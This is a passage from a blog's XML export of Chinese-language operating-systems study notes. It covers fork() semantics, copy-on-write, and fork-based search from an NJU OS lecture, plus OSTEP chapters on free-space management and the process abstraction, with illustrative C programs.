class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">4</span>; i++) ans += sum[i];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, ans); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Material</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 15: More about fork()</title>
    <url>/2022/04/09/NJU-OS%20Lecture%2015%20-%20More%20about%20fork()/</url>
    <content><![CDATA[<h2 id="fork-Semantics"><a href="#fork-Semantics" class="headerlink" title="fork() Semantics"></a><code>fork()</code> Semantics</h2><p>fork() 的语义是将当前进程的状态机完整地复制一份，这两个进程除了 fork() 的返回值以外全部相同。</p>
<h3 id="File-Descriptors"><a href="#File-Descriptors" class="headerlink" title="File Descriptors"></a>File Descriptors</h3><p>我们这里关注文件描述符：根据 fork() 的语义，子进程和父进程会拥有相同的文件描述符 (文件描述符可以理解为指向操作系统对象的指针)。execve() 会重置状态机，但会继承原进程持有的所有操作系统对象。这个设计使我们在 UNIX shell 中可以利用管道技术，在 execve() 之前修改 stdin, stdout 以完成进程之间数据的传输。<span id="more"></span></p>
<blockquote>
<p><strong>execve() 会无条件继承所有的对象吗？</strong></p>
<p>在 open() 的手册中，我们可以看到打开文件时有一个标志是 O_CLOEXEC，这样打开的文件在 execve() 的时候不会被继承。</p>
</blockquote>
<p>文件描述符其实不仅仅是指向对象的指针。我们在一个程序中写两句话</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">write(fd, <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line">write(fd, <span class="string">&quot;World&quot;</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>

<p>我们得到的会是 “HelloWorld” 而不是 “World”，这说明文件描述符中还保存了一个对象当前的 offset。那么一个自然的问题是：如果我们 fork 出一个子线程，然后父子线程分别打印 Hello 和 World，我们会得到两个字符串还是一个字符串呢？我们可以写一个程序验证一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fork-fd.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">&quot;a.txt&quot;</span>, O_RDWR | O_CREAT | O_TRUNC);</span><br><span class="line">	<span class="keyword">int</span> rt = fork();</span><br><span class="line">	<span class="keyword">if</span> (rt == <span class="number">0</span>)</span><br><span class="line">		write(fd, <span class="string">&quot;World&quot;</span>, <span class="number">5</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		write(fd, <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line">	wait(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (rt == <span class="number">0</span>) write(fd, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该程序会输出 “HelloWorld” (或者 “WorldHello”)，而不是只有五个字符。这说明 fork 之后的两个进程后续仍然是共享文件偏移的。这样的设计显然符合一个“正常“的程序员的需求。查阅 dup() 系统调用的手册，我们可以看到 dup() 获得的新文件描述符和被复制的文件描述符也是共享文件偏移的。</p>
<p>共享偏移对操作系统内核提出了较强的挑战。内核必须非常小心，保证对文件描述符的操作是原子的 (在 <code>man 2 write</code> 中可以看到 Linux 内核关于 file offset 的 bug 在内核 3.14 版本中才得到修复)。</p>
<h3 id="Copy-on-write-Fork"><a href="#Copy-on-write-Fork" class="headerlink" title="Copy-on-write Fork"></a>Copy-on-write Fork</h3><p>fork() 的语义是完整复制了状态机，但在实现层面，现代内核并不是立即复制所有的数据。fork() 有大量的场景都是为了启动一个新程序，即 fork() + execve() 的组合，这种情况下我们复制完的地址空间会立刻被新的程序镜像覆盖，复制工作就很浪费。</p>
<p>现代内核普遍使用 copy-on-write fork (写时拷贝) 技术，即 fork() 时子进程完整复制父进程的页表，两者指向相同的页面，并暂时将页面的写权限去掉。这样之后如果父子进程读取数据，两者可以并行不悖。如果某个进程需要写数据，会因为没有写权限触发 page fault，内核的 page fault handler 发现这是一个 cow 页面，便会现场复制一个新的页面，让父子进程指向不同的页面，并把写权限恢复。</p>
<p>cow fork 在实现层面还有一些细节，比如每个页面需要维护一个 reference count，之后对一个页面 malloc() 和 free() 的语义要做出一些修改，以及根据 ISA 确定如何在页表项中添加 cow 页面标志位等等。</p>
<p>我们可以通过一个小程序感受 Linux 内核的 copy-on-write fork：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cow-test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NPROC 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MB 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE (MB * (1 &lt;&lt; 20))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xstr(s) str(s)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> str(s) #s</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *data = <span class="built_in">malloc</span>(SIZE); <span class="comment">// 128MB shared memory</span></span><br><span class="line">  <span class="built_in">memset</span>(data, <span class="string">&#x27;_&#x27;</span>, SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NPROC - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// NPROC processes go here</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;.fill 1048576 * &quot;</span> xstr(MB) <span class="string">&quot;, 1, 0x90&quot;</span>)</span></span>; <span class="comment">// 128MB shared code</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY); assert(fd &gt; <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;idx, <span class="keyword">sizeof</span>(idx));</span><br><span class="line">  close(fd);</span><br><span class="line">  idx %= <span class="number">1048576</span> * MB;</span><br><span class="line"></span><br><span class="line">  data[idx] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;pid = %d, write data[%u]\n&quot;</span>, getpid(), idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    sleep(<span class="number">1</span>); <span class="comment">// not terminate</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>cow-test.c</code> 中，我们用 fork() 创建了 1000 个子进程，每个进程都有一个大小为 128M 的代码区 (都是 nop 指令)，每个进程还会随机挑选一个位置进行修改。编译后，我们的可执行文件大小就在 128M 左右。如果内核使用普通的 fork，这个程序运行到一半就会因内存不足而崩溃。但事实上 Linux 运行的很好。这证明了 Linux 中使用了 cow fork 策略。</p>
<p>cow fork 策略的一个推论便是：想要统计一个程序运行时占用的内存空间是一个伪命题 (比如操作系统里的 libc 代码只有一份，不知道有多少程序的页表指向了它)。</p>
<h2 id="State-Machine-fork-and-Magic"><a href="#State-Machine-fork-and-Magic" class="headerlink" title="State Machine, fork() and Magic"></a>State Machine, <code>fork()</code> and Magic</h2><p>fork() 可以完整复制状态机，这可以帮助我们完成很多炫酷的事情，比如开平行宇宙做 non-deterministic 的事情。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEST  <span class="meta-string">&#x27;+&#x27;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EMPTY <span class="meta-string">&#x27;.&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">move</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> x, y, ch;</span><br><span class="line">&#125; moves[] = &#123;</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;&gt;&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="number">1</span>, <span class="number">0</span>, <span class="string">&#x27;v&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">-1</span>, <span class="string">&#x27;&lt;&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="number">-1</span>, <span class="number">0</span>, <span class="string">&#x27;^&#x27;</span> &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> <span class="built_in">map</span>[][<span class="number">512</span>] = &#123;</span><br><span class="line">  <span class="string">&quot;#######&quot;</span>,</span><br><span class="line">  <span class="string">&quot;#.#.#+#&quot;</span>,</span><br><span class="line">  <span class="string">&quot;#.....#&quot;</span>,</span><br><span class="line">  <span class="string">&quot;#.....#&quot;</span>,</span><br><span class="line">  <span class="string">&quot;#...#.#&quot;</span>,</span><br><span class="line">  <span class="string">&quot;#######&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">map</span>[x][y] == DEST) &#123;</span><br><span class="line">    display();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> nfork = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (struct move *m = moves; m &lt; moves + <span class="number">4</span>; m++) &#123;</span><br><span class="line">      <span class="keyword">int</span> x1 = x + m-&gt;x, y1 = y + m-&gt;y;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">map</span>[x1][y1] == DEST || <span class="built_in">map</span>[x1][y1] == EMPTY) &#123;</span><br><span class="line">        <span class="keyword">int</span> pid = fork(); assert(pid &gt;= <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// map[][] copied</span></span><br><span class="line">          <span class="built_in">map</span>[x][y] = m-&gt;ch;</span><br><span class="line">          dfs(x1, y1);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// clobbered map[][] discarded</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          nfork++;</span><br><span class="line">          waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">// wait here to serialize the search</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (nfork--) wait(<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  dfs(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; ; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">char</span> *s = <span class="built_in">map</span>[i]; *s; s++) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*s) &#123;</span><br><span class="line">        <span class="keyword">case</span> EMPTY: <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DEST : <span class="built_in">printf</span>(<span class="string">&quot; ○ &quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>  : <span class="built_in">printf</span>(<span class="string">&quot; → &quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>  : <span class="built_in">printf</span>(<span class="string">&quot; ← &quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;^&#x27;</span>  : <span class="built_in">printf</span>(<span class="string">&quot; ↑ &quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>  : <span class="built_in">printf</span>(<span class="string">&quot; ↓ &quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>   : <span class="built_in">printf</span>(<span class="string">&quot;▇▇▇&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(<span class="built_in">map</span>[i]) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">1</span>); <span class="comment">// to see the effect of parallel search</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>dfs-fork.c</code> 是一个走迷宫程序，不同于基本的 dfs 走迷宫，它的 dfs() 函数中每发现一个新的路，便会 fork 一个新的进程去做它，结尾处的 <code>sleep(1)</code> 用于模拟一个耗时很长的任务。现在的 <code>dfs-fork.c</code> 还不能做到并行，因为 dfs 函数中当前进程会 wait 一个分支的子进程结束才会探索下一个分支。但我们如果把 dfs 循环内的 wait 去掉，就可以观测到程序“秒”完成任务。</p>
<p>fork() 相较于搜索-回溯还有一个好处：当我们探索一个分支失败时，我们不用一步一步撤回去，而是可以直接销毁当前进程，然后从之前保存的副本出发搜索新的分支。</p>
<h3 id="Parallel-Universe-Skipping-Initialization"><a href="#Parallel-Universe-Skipping-Initialization" class="headerlink" title="Parallel Universe: Skipping Initialization"></a>Parallel Universe: Skipping Initialization</h3><p>以 NEMU 举例，我们可能需要运行很多个 benchmark，但 NEMU 的初始化过程很长，我们能不能只进行一次初始化，然后让多个 benchmark 共享这一次初始化呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    nemu_init();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        file = get_start_request();</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">            load_file();</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面一段 C 代码大致实现了我们的想法。我们在 init() 结束后，每次 fork 一个子进程做一个 benchmark，就可以让多个 benchmark 共享初始化刚结束时的状态机了。</p>
<p>类似的思想在实际中也有广泛应用：</p>
<ul>
<li>Zygote Process：zygote 是受精卵的意思，这是 Android 里的一个机制。Java 程序启动需要加载很多的 class node，这个过程很慢，但事实上现在的 Android app 基本都是秒起的。这是因为 Android 的一个 zygote process 完成所有的初始化工作，然后每开一个 app 直接在 zygote process 的基础上 fork，设置一些权限、用户 id 之后很快就可以开始执行 app 代码。</li>
<li>Chrome site isolation：Chrome 的每个标签页都是一个独立的进程，这其中也有共享初始化资源的技术，这让 chrome 的速度变得很快。</li>
<li>……</li>
</ul>
<h3 id="Parallel-Universe-Backup-and-Fault-tolerence"><a href="#Parallel-Universe-Backup-and-Fault-tolerence" class="headerlink" title="Parallel Universe: Backup and Fault-tolerence"></a>Parallel Universe: Backup and Fault-tolerence</h3><p>有了平行宇宙，我们就有了犯错的底气：我们可以时不时地对状态机 fork，如果某个时刻程序 crash 了，我们就恢复最近一次保存的状态机副本；如果到了下一个存档点仍然没有 crash，我们在 fork 出新的存档的同时可以把上一份存档销毁。</p>
<p>平行宇宙还可以为我们提供容错机制：比如有一些并发 bug 触发的概率很小。那么如果某一次不幸地触发了并发 bug，我们可以利用存档点回到过去，然后再跑一遍，说不定就绕过了 bug 可以继续执行了。</p>
<h2 id="A-fork-in-the-Road"><a href="#A-fork-in-the-Road" class="headerlink" title="A fork() in the Road"></a>A <code>fork()</code> in the Road</h2><p>将状态机完整地复制一遍在早期是一件轻量级的事情，但现在随着系统中的机制越来越丰富，fork() 要做的事情越来越繁重：信号、线程、ptrace 等等。fork() 的语义也变得越来越复杂。比如：</p>
<ul>
<li>有了信号机制后，当操作系统给进程发送信号时，子进程是否也接收到这个信号？答案是子进程也会接收到信号，这就设计了 process group 等一系列概念。</li>
<li>当线程加入后，fork 是把当前进程的所有线程复制，还是只复制执行 fork 的线程？答案是后者。</li>
<li>……</li>
</ul>
<p>POSIX 给出的一个更安全的创建子进程的 API 是 posix_spawn()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">posix_spawn</span><span class="params">(<span class="keyword">pid_t</span> *pid, <span class="keyword">const</span> <span class="keyword">char</span> *path,</span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="keyword">const</span> <span class="keyword">posix_spawn_file_actions_t</span> *file_actions,</span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="keyword">const</span> <span class="keyword">posix_spawnattr_t</span> *attrp,</span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>

<p>它有相当复杂的参数。这是一个非常明显的 fork 后时代设计的 API，它打包执行 fork 和 execve，将执行过程分为 fork, pre-exec 和 exec 三个阶段，并在 pre-exec 阶段对 signal handler, file action 等东西做一系列设置。</p>
<p><em>A fork() in the Road</em> 一文中提出了 fork() 的七宗罪：</p>
<ul>
<li>Fork is no longer simple - 要考虑的机制越来越多；</li>
<li>Fork doesn’t compose - 比如 <code>fork-printf.c</code>，将标准库中 buffer 的内容复制很可能不是程序员的初衷；</li>
<li>Fork isn’t thread-safe</li>
<li>Fork is insecure - fork() 出的子进程和父进程地址空间完全相同，打破了 ASLR；</li>
<li>Fork is slow </li>
<li>Fork doesn’t scale</li>
<li>Fork encourages memory overcommit</li>
</ul>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 17: Free Space Management</title>
    <url>/2022/03/07/OSTEP/OSTEP%20Chapter%2017%20-%20Free%20Space%20Management/</url>
    <content><![CDATA[<p>动态大小的内存分配是比较困难的：随着反复的分配和释放，空闲内存会被切分成很多碎片，此时即使空闲空间的总量大于某个分配需求，分配也可能因为剩余空间过于碎片化而失败。因此，我们在管理空闲空间时要兼顾效率、空闲空间连续性、内存消耗等多方面因素。<span id="more"></span></p>
<h2 id="17-1-Assumptions"><a href="#17-1-Assumptions" class="headerlink" title="17.1 Assumptions"></a>17.1 Assumptions</h2><p>这里我们假设内存申请和释放的接口和 C 库中的 malloc()/free() 相同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span>;</span><br></pre></td></tr></table></figure>

<p>注意：释放空间时，调用者只传入起始地址，不传入空间的 size，因此我们在分配时就要想办法记录每块分配出去的空间的大小。</p>
<p>分配空间的过程中严禁出现 double-alloc 的情况。</p>
<h2 id="17-2-Low-level-Mechanisms"><a href="#17-2-Low-level-Mechanisms" class="headerlink" title="17.2 Low-level Mechanisms"></a>17.2 Low-level Mechanisms</h2><h3 id="Splitting-and-Coalescing"><a href="#Splitting-and-Coalescing" class="headerlink" title="Splitting and Coalescing"></a>Splitting and Coalescing</h3><p>我们用一个链表维护所有的空闲内存区间，链表的每个节点代表一段连续的空闲内存，有起始地址，块大小等字段。当我们要分配一段内存出去，且分配大小小于当前链表节点大小时，我们可以将链表节点的前半部分切出去给调用者，后半部分保留在链表中。这就是 splitting。</p>
<p>当 free() 将一段内存空间释放时，如果我们不加任何操作地将其放到链表头，时间久了就会出现完整的空闲内存被我们人为地切成了若干个首尾相接的段的情况。一个好的维护方法是：链表中的所有节点按照顺序排列，每当新插入节点时，将其与前后相邻的节点比较，如果地址连在了一起就合并节点。这就是 coalescing。</p>
<h3 id="Tracking-The-Size-Of-Allocated-Regions"><a href="#Tracking-The-Size-Of-Allocated-Regions" class="headerlink" title="Tracking The Size Of Allocated Regions"></a>Tracking The Size Of Allocated Regions</h3><p>free() 函数传入的只有待释放内存空间的起始地址，我们必须在分配的时候想办法记录分配出去的空间大小。一种方法是在分配区域首地址的前面记录一个 header：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">header_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">&#125;<span class="keyword">header_t</span>;</span><br></pre></td></tr></table></figure>

<p>当 <code>free(void *ptr)</code> 来到时，我们首先在 ptr 前方的 header 处检查魔数是否正确以判定这是否是一个合法的可释放地址。如果魔数检查通过，我们便可以取出 size。注意最后加入空闲空间链表的总大小应为 <code>size + sizeof(header_t)</code>。</p>
<h3 id="Embedding-A-Free-List"><a href="#Embedding-A-Free-List" class="headerlink" title="Embedding A Free List"></a>Embedding A Free List</h3><p>我们需要空间来保存链表，但我们作为 memory allocator 本身，当然不能调用 malloc() 去申请内存。我们应当将链表节点直接保存在空闲的内存空间里。</p>
<p>当一个 alloc() 需求来临时，选择一个合法的节点 split 出需要的空间。当一个 free() 来临时，将新的空闲空间节点加入链表，并在可以时与相邻节点合并。</p>
<h3 id="Growing-The-Heap"><a href="#Growing-The-Heap" class="headerlink" title="Growing The Heap"></a>Growing The Heap</h3><p>当扫描完整个空闲空间链表但仍然无法分配出所需大小的空间时，返回 NULL 表示无法分配是完全合情合理的。对于应用层的 memory allocator 来说，如果内存耗尽，它会用系统调用 (如 sbrk()) 向操作系统申请更多的内存并将其加入到空闲空间链表中。</p>
<h2 id="17-3-Basic-Strategies"><a href="#17-3-Basic-Strategies" class="headerlink" title="17.3 Basic Strategies"></a>17.3 Basic Strategies</h2><p>由于申请内存和释放内存的行为是完全由上层程序决定的，所以任何策略都会在针对性的 input 下把内存搞得很破碎。我们无法给出完美的解决方案，但至少可以提出一些比较有可能较优的解决方案。</p>
<h3 id="Best-Fit-Smallest-Fit"><a href="#Best-Fit-Smallest-Fit" class="headerlink" title="Best Fit (Smallest Fit)"></a>Best Fit (Smallest Fit)</h3><p>Best fit 策略是：alloc() 需求来临时，根据大小从链表中找出可以满足要求且大小最小的链表节点 split 出一块。该策略可以比较好地减少破碎的内存块，但每次 alloc() 都完整地遍历链表代价太大。</p>
<h3 id="Worst-Fit"><a href="#Worst-Fit" class="headerlink" title="Worst Fit"></a>Worst Fit</h3><p>Worst Fit 每次挑最大的内存块切割，这样可以避免出现很多破碎的小内存块，但它也要遍历整个链表，而且实际情况下效果不好。</p>
<h3 id="First-Fit"><a href="#First-Fit" class="headerlink" title="First Fit"></a>First Fit</h3><p>First Fit 总是寻找第一个足够切割的内存块 alloc()，这样不需要遍历整个链表。但做久了以后链表的头部会充斥比较多的内存碎片。</p>
<h3 id="Next-Fit"><a href="#Next-Fit" class="headerlink" title="Next Fit"></a>Next Fit</h3><p>Next Fit 的做法是保存上一次分配的位置，下一次要分配时从上一次的位置开始 First Fit。实践中这种方法的表现和 First Fit 差不多。</p>
<h2 id="17-4-Other-Approaches"><a href="#17-4-Other-Approaches" class="headerlink" title="17.4 Other Approaches"></a>17.4 Other Approaches</h2><h3 id="Segregated-List"><a href="#Segregated-List" class="headerlink" title="Segregated List"></a>Segregated List</h3><p>slab 的基本思路时：对于一些比较常见的分配大小 (比如 4B, 2B, page size) 等，可以准备一个链表专门存储这种大小的块块，这样分配的时候直接从链表中取一个节点即可，不需要之前所说的繁琐的切分、合并等步骤。slab 有点像全局 memory manager 的一个 cache，如果某个时刻 slab 里的节点用完了，它会从全局的大链表中再批发一些节点。</p>
<h3 id="Buddy-Allocation"><a href="#Buddy-Allocation" class="headerlink" title="Buddy Allocation"></a>Buddy Allocation</h3><p>Buddy Allocation 比较像“线段树”：它把一个长度为 $2^N$ 的区间分成左右各 $2^{N-1}$ 的，每个节点再一分为二，依次类推。这样我们不需要仔细地维护拆分、合并相关的问题。Buddy Allocation 的弱点在于：为了对齐我们只能分配 2 的幂次大小的块，会造成一些 internal fragmentation。 </p>
<h2 id="17-5-Summary"><a href="#17-5-Summary" class="headerlink" title="17.5 Summary"></a>17.5 Summary</h2><p>略。</p>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 04: The Abstraction: The Process</title>
    <url>/2022/03/20/OSTEP/OSTEP%20Chapter%2004%20-%20The%20Abstraction%20-%20The%20Process/</url>
    <content><![CDATA[<p>进程就是正在运行的程序。程序本身只是存储在硬盘上的指令和数据的集合，只有 OS 将其加载到内存中运行起来时程序才会发挥作用。</p>
<p>通常操作系统上会运行多个程序 - 比 CPU 核个数更多的程序。但每个程序并不需要关心 CPU 当前是否可用，这是因为 OS 为进程虚拟化了 CPU。OS 的基本操作是运行一个进程，然后暂停它去运行一会儿另外一个进程，这是分是运行的基本思想。<span id="more"></span></p>
<p>为了实现 CPU 的虚拟化，OS 既需要底层的机制，也需要上层的智慧。所谓<strong>机制 (mechanism)</strong> 指的是实现某个功能所需要的一些底层的方法或协议。比如操作系统为了实现进程的切换，必须要有上下文切换的机制。分时运行也是一种机制，被所有的现代操作系统采用。</p>
<blockquote>
<p><strong>Time Sharing 和 Space Sharing</strong></p>
<p>Time Sharing 是 OS 共享资源的一种基本方式，即每个人用一会儿，然后把资源交给下一个人。Time sharing 不仅仅用在多个进程/线程共享 CPU 上，共享的资源都可以使用这种机制，比如网络连接。</p>
<p>与 time sharing 互为补充的是 space sharing。磁盘就是一种 space sharing 的模型。</p>
</blockquote>
<p>在机制之上是策略。<strong>策略 (policy)</strong> 是操作系统做出决定的一些算法，比如如何调度各个进程就需要一个 scheduling policy，这里有多种可能性，比如根据优先级，根据历史运行时长等等 (如果说机制是 OS 必须的东西，那么策略影响的其实只是效率)。</p>
<blockquote>
<p><strong>区分机制和策略</strong></p>
